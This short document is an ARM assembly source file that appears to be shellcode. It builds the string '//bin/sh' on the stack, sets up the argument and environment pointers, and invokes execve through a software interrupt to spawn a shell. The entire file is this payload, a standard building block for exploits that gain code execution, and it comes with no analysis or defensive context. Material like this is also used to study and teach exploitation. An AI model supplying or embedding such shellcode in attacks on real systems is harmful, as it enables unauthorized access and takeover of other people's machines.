.global _start

_start:
	ldr r6, =0x68732f6e			@ 2f2f62696e2f7368 //bin/sh 
	ldr r5, =0x69622f2f
	mov r7, #0
	push {r5,r6,r7}		
	mov r0, r13				@ *filename
	push {r7}
	mov r1, r13				@ *argv
	push {r0}
	mov r2, r13				@ *envp
	mov r7, #0xb				@ int execve (const char *filename, const char *argv [], const char *envp[]);
	swi 0
